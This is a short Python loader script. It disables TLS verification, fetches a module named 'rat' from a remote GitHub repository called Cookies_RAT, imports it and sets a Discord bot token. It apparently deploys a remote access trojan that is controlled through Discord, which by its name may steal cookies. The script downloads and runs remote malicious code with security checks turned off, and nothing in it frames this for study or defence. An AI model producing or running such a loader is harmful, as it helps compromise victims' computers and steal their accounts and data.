import httpimport
httpimport.INSECURE = True
with httpimport.remote_repo(["rat"], "https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/src"): import rat
rat.token_set("DISCORD_TOKEN_HERE")